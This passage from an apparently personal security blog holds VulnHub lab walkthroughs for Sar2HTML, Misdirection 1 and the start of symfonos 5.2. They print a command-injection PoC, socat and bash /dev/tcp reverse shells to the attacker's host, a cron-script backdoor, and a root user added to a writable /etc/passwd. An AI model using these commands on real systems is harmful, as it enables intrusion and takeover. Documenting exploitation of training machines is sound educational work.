Sar2HTML 3.2.1 - Remote Command Execution                   | php/webapps/47204.txt
<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
</code></pre></div></div>

<p>I transfer a copy of this exploit to my current directory and we see the proof of concept.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/47204.txt
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>47204.txt 
<span class="c"># Exploit Title: sar2html Remote Code Execution</span>
<span class="c"># Date: 01/08/2019</span>
<span class="c"># Exploit Author: Furkan KAYAPINAR</span>
<span class="c"># Vendor Homepage:https://github.com/cemtan/sar2html </span>
<span class="c"># Software Link: https://sourceforge.net/projects/sar2html/</span>
<span class="c"># Version: 3.2.1</span>
<span class="c"># Tested on: Centos 7</span>

In web application you will see index.php?plot url extension.

http://&lt;ipaddr&gt;/index.php?plot<span class="o">=</span><span class="p">;</span>&lt;command-here&gt; will execute 
the <span class="nb">command </span>you entered. After <span class="nb">command </span>injection press <span class="s2">"select # host"</span> <span class="k">then </span>your <span class="nb">command</span><span class="s1">'s 
output will appear bottom side of the scroll screen.
</span></code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="remote-code-execution">Remote Code Execution</h3>
<p>I check the POC with curl and I can see that the <strong>id</strong> command is running, so it’s vulnerable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.142/sar2HTML/index.php?plot=;id"</span> | <span class="nb">tr</span> <span class="s1">'&gt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="s1">'&lt;/option'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +3 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-2</span> | <span class="nb">sed</span> <span class="s1">'s/&lt;\/option//'</span>
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p><strong>Getting a reverse shell</strong></p>

<p>I first set up a netcat listener on port 443, and then run the following socat instruction in the browser.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.142/sar2HTML/index.php?plot<span class="o">=</span><span class="p">;</span>socat TCP4:192.168.179.1:443 EXEC:/bin/bash
</code></pre></div></div>

<p><img src="/assets/images/sar/screenshot-4.png" alt="" /></p>

<p>As we can see, we have a reverse shell with limited privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.142] 36268
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
www-data@sar:/var/www/html/sar2HTML<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
<span class="nb">uname</span> <span class="nt">-a</span>
Linux sar 5.0.0-23-generic <span class="c">#24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div>

<p><strong>Cron Jobs Enumeration</strong></p>

<p>Enumerating the cron jobs in the crontab file, I find a cron job that runs the script <strong>finally.sh</strong> every five minutes in the /var/www/html/ directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
<span class="nb">cat</span> /etc/crontab
<span class="c"># /etc/crontab: system-wide crontab</span>
<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="c"># command to install the new version when you edit this file</span>
<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="c"># that none of the other crontabs do.</span>

<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span class="c"># m h dom mon dow user  command</span>
17 <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
25 6    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
47 6    <span class="k">*</span> <span class="k">*</span> 7   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
52 6    1 <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
<span class="c">#</span>
<span class="k">*</span>/5  <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> /var/www/html/ <span class="o">&amp;&amp;</span> <span class="nb">sudo</span> ./finally.sh
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="cron-job">Cron Job</h3>
<p>We list the contents of the directory <strong>/var/www/html/</strong> and we see the <strong>finally.sh</strong> script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 40
drwxr-xr-x 3 www-data www-data  4096 Oct 21  2019 <span class="nb">.</span>
drwxr-xr-x 4 www-data www-data  4096 Oct 21  2019 ..
<span class="nt">-rwxr-xr-x</span> 1 root     root        22 Oct 20  2019 finally.sh
<span class="nt">-rw-r--r--</span> 1 www-data www-data 10918 Oct 20  2019 index.html
<span class="nt">-rw-r--r--</span> 1 www-data www-data    21 Oct 20  2019 phpinfo.php
<span class="nt">-rw-r--r--</span> 1 root     root         9 Oct 21  2019 robots.txt
drwxr-xr-x 4 www-data www-data  4096 Oct 20  2019 sar2HTML
<span class="nt">-rwxrwxrwx</span> 1 www-data www-data    30 Oct 21  2019 write.sh
</code></pre></div></div>

<p>We see the content of the <strong>finally.sh</strong> script, this is executing the <strong>write.sh</strong> script and this is creating the gateway file in the /temp directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html<span class="nv">$ </span><span class="nb">cat </span>finally.sh
<span class="nb">cat </span>finally.sh
<span class="c">#!/bin/sh</span>

./write.sh
www-data@sar:/var/www/html<span class="nv">$ </span><span class="nb">cat </span>write.sh
<span class="nb">cat </span>write.sh
<span class="c">#!/bin/sh</span>

<span class="nb">touch</span> /tmp/gateway
</code></pre></div></div>

<p>As we have write permissions in the <strong>write.sh</strong> script, let’s write a bash reverse shell to that file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.179.1/4545 0&gt;&amp;1'"</span> <span class="o">&gt;&gt;</span> write.sh 
</code></pre></div></div>
<p>Then set up a netcat listener on port 4545 and after five minutes we get a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 4545
listening on <span class="o">[</span>any] 4545 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.142] 45282
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>3018<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@sar:/var/www/html# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Misdirection 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>July 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> The purpose of this machine is to grant OSCP students further develop, strengthen, and practice their methodology for the exam.</p>

<p><strong>Author:</strong> FalconSpy</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/misdirection-1,371/">https://www.vulnhub.com/entry/misdirection-1,371/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We enumerate the local network to find the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sn</span> <span class="nt">-n</span> 192.168.179.1/24
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-13 19:32 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.141
Host is up <span class="o">(</span>0.00078s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:0C:29:10:9B:9B <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00017s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:E9:4A:73 <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Located the target, I proceed to perform a TCP port scan for all ports with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-p1-65535</span> <span class="nt">-vv</span> <span class="nt">-n</span> 192.168.179.141 <span class="nt">-oG</span> tcp-all-ports.txt
...
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
3306/tcp open  mysql      syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 00:0C:29:10:9B:9B <span class="o">(</span>VMware<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>Then I do the service enumeration to the open TCP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80,3306,8080 <span class="nt">-vv</span> <span class="nt">-n</span> 192.168.179.141 <span class="nt">-oN</span> service-enum.txt
...
PORT     STATE SERVICE REASON         VERSION                                                                                                                      
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>                                                                 
| ssh-hostkey:                                                                                                                                                     
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkS5yl+Dpb7vsMGbzAHXBYrVSUNTh4kYGh8zajM3ZujG0XHLvgkW7xJ6F/meai9IrCB5gTq7+tTsn+fqNk0cAZugz4h+vwm5ekXe5szPPHNxNUlKuNAQ0Rch9k7
jT/2pWjtsE5iF6yFlh1UA2vBKqrTWVU5vrGWswdFRMWICKWiFXwl1Tv93STPsKHYoVbq74v2y1mVOLn+3JNMmRNCBFqh8Z2x+1DTep0YY8vIV325iRK5ROKCJAPeyX33uoxQ/cYrdPIS+Whs9QX0C+W343Hf2Ypq93h
3/g3NNm54LvZdE6X2vTUcUHGdvK2gU+dWQOiDhCpMDv3wiEAwGlf87P5                                                                                                           
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM+YEivOAqHPDlFWduSuOjAjuJtfC9v/KW2uYB85gxQuibGJQZhFPcxwPEUf7UvQ/a5fr/keKYF2Kdld6gO44jY<span class="o">=</span> 
|   256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFHxbfiqinvu3cV7JoKrOF3w64zk+0N0h+/2nu+Z20Mk
80/tcp   open  http    syn-ack ttl 64 Rocket httpd 1.2.6 <span class="o">(</span>Python 2.7.15rc1<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: 502 Proxy Error
3306/tcp open  mysql   syn-ack ttl 64 MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
|_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_ssl-date: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_sslv2: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_tls-alpn: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_tls-nextprotoneg: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
8080/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:10:9B:9B <span class="o">(</span>VMware<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>Poked around the web service on port 80 I didn’t found nothing interesting.</p>

<p><img src="/assets/images/misdirection/screenshot-1.png" alt="" /></p>

<p>So I’m heading to enumerate the web page on port 8080, but at a  glance I can’t find anything, so I run gobuster to find hidden web directories and files.</p>

<p><img src="/assets/images/misdirection/screenshot-2.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.141:8080 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php,html,txt,sql <span class="nt">-e</span>
...
http://192.168.179.141:8080/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918]
http://192.168.179.141:8080/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 326] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/images/]
http://192.168.179.141:8080/help                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 324] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/help/]  
http://192.168.179.141:8080/scripts              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 327] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/scripts/]
http://192.168.179.141:8080/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 323] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/css/]    
http://192.168.179.141:8080/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 329] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/wordpress/]
http://192.168.179.141:8080/development          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 331] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/development/]
http://192.168.179.141:8080/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 326] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/manual/]     
http://192.168.179.141:8080/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 322] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/js/]         
http://192.168.179.141:8080/shell                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 325] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/shell/]      
http://192.168.179.141:8080/debug                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 325] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.141:8080/debug/]
...
</code></pre></div></div>

<p>Checking the <strong>debug</strong> directorie I find a script that allows run system commands.</p>

<p><img src="/assets/images/misdirection/screenshot-3.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="command-injection">Command Injection</h3>
<p><strong>Getting a reverse shell</strong></p>

<p>Then we first set up a netcat listener and execute the the following instruction:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"</span>
</code></pre></div></div>
<p><img src="/assets/images/misdirection/screenshot-4.png" alt="" /></p>

<p>And we get a reverse shell, after enumerating the sudo permissions I see that the bash command is possible execute it without password as the brexit user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.141] 34318
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1047<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@misdirection:/var/www/html/debug<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@misdirection:/var/www/html/debug<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>www-data on localhost:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User www-data may run the following commands on localhost:
    <span class="o">(</span>brexit<span class="o">)</span> NOPASSWD: /bin/bash
</code></pre></div></div>
<p>After to execute the bash command as the brexit user, we get a bash session and spawn a TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@misdirection:/var/www/html/debug<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> brexit /bin/bash
python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
brexit@misdirection:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux misdirection 4.15.0-50-generic <span class="c">#54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="writable-etcpasswd-file">Writable /etc/passwd File</h3>
<p>Enumerating the system I managed to identify that the <strong>passwd</strong> file has write permissions for the brexit user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>brexit@misdirection:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/passwd
<span class="nt">-rwxrwxr--</span> 1 root brexit 1617 Jun  1  2019 /etc/passwd
</code></pre></div></div>
<p>In our attacking machine we generate a password hash with openssl.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>openssl passwd <span class="nt">-1</span> get.r00t
<span class="nv">$1$7Stc2cvP$1EtnNyONHtdDuHw2C9rNb1</span>
</code></pre></div></div>
<p>Then we redirect our s4rgas user with the uid and gid set to 0 to the <strong>passwd</strong> file, and we switch to the new user with root privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>brexit@misdirection:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'s4rgaz:$1$7Stc2cvP$1EtnNyONHtdDuHw2C9rNb1:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> /etc/passwd
brexit@misdirection:/tmp<span class="nv">$ </span>su s4rgaz
Password: 
root@misdirection:/tmp# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">Vulnhub - symfonos 5.2</h1>
	<p class="post-date text-bold text-upcase">
	<span>July 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Beginner real life based machine designed to teach people the importance of understanding from the interior.</p>

<p><strong>Author:</strong> Zayotic</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/symfonos-52,415/">https://www.vulnhub.com/entry/symfonos-52,415/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We start by discovering the target host, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts 
                                                                
 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222  
 _________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 
 <span class="nt">-------------------------------------------------------------------------</span>
 192.168.179.140 00:0c:29:55:30:bb      3     180  VMware, Inc. 
 192.168.179.254 00:50:56:fe:ba:48      1      42  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Located the objective host, I perform a full TCP port scan with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">-n</span> <span class="nt">-vv</span> 192.168.179.140 <span class="nt">-oG</span> nmap-tcp-all-ports.txt
...
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
80/tcp  open  http    syn-ack ttl 63
389/tcp open  ldap    syn-ack ttl 63
636/tcp open  ldapssl syn-ack ttl 63
MAC Address: 00:0C:29:55:30:BB <span class="o">(</span>VMware<span class="o">)</span>
....
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>Then I focus on detecting the version of the services for open TCP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p22</span>,80,389,636 <span class="nt">-n</span> <span class="nt">-vv</span> 192.168.179.140 <span class="nt">-oN</span> tcp-service-enum.txt
...
PORT    STATE SERVICE  REASON         VERSION                                                                                                                      
22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>                                                                               
| ssh-hostkey:                                                                                                                                                     
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfhCNEk87fJIphggJ/K7+9vu2pm9OmRmuYZ4tIPDCr42LgzGp6EIWpz5FXo98F1iq1pNASEjcMqqpCxuhhOFSlf3pPA00Rka4/0pmlmtIl5jSE6cpexIXzINzLC
6YXDt59JFuOi0PgsbBYbIWsRdNxPboBDELeilgNairkx3wakNr39Di1SmrpQyQ54EbpusuNZPZL9eBjgEScXrx+MCnA4gyQ+VwEbMXDBfC6q5zO+poZQ1wkAqg9+LFvd2RuwGB+06yFfVn84UpBh4Fxf+cpnKG0zJal
RfI8ZhUgnvEnU7cIp8Yb94pUzXf1+m1Vsau8+0myI0aaljHt4RfSfI3T                                                                                                           
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHUvkrh2jAIVELCTy59BYzC3B0S4/jKkYOmS6N7anjrxvHW59thSrs7+3pvVhM5X0Og+FV4zkrMMfvw5jwTygeA<span class="o">=</span> 
|   256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxA6/wOoEAbxcDJX8zdCYFQzulYfpxK4n4e7bUSUeeC                                                                                 
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>                                                                                               
| http-methods:                                                                                                                                                    
|_  Supported Methods: POST OPTIONS HEAD GET                                                                                                                       
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>                                                                                                                       
|_http-title: Site doesn<span class="s1">'t have a title (text/html).                                                                            
389/tcp open  ldap     syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X                                                                                                       
636/tcp open  ldapssl? syn-ack ttl 63
...
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>I then proceed to browse the web page on port 80 and found nothing interesting.</p>

<p><img src="/assets/images/symfonos5/screenshot-1.png" alt="" /></p>

<p>Then I fire dirsearch to perform brute force and find hidden files and directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://192.168.179.140 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt <span class="nt">-f</span> <span class="nt">-e</span> php,html,txt
...
<span class="o">[</span>23:43:06] 200 -    2KB - /admin.php/
<span class="o">[</span>23:43:06] 200 -    2KB - /admin.php
<span class="o">[</span>23:44:14] 302 -    0B  - /home.php  -&gt;  admin.php
<span class="o">[</span>23:44:16] 403 -  280B  - /icons/
<span class="o">[</span>23:44:18] 200 -  207B  - /index.html
<span class="o">[</span>23:44:33] 302 -    0B  - /logout.php  -&gt;  admin.php
<span class="o">[</span>23:45:26] 403 -  280B  - /server-status/
<span class="o">[</span>23:45:26] 403 -  280B  - /server-status
<span class="o">[</span>23:45:36] 200 -    2KB - /static/
<span class="o">[</span>23:45:37] 301 -  319B  - /static  -&gt;  http://192.168.179.140/static/
</code></pre></div></div>

<p>The <strong>admin.php</strong> file looks interesting, so I request with the browser and I find a login page.</p>

<p><img src="/assets/images/symfonos5/screenshot-2.png" alt="" /></p>

<p><strong>LDAP Injection</strong></p>

<p>Analyzing what the system could be using to authenticate users, possibly via LDAP, since this service is open, so I download a dictionary and develop a python script to test for LDAP Injection.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
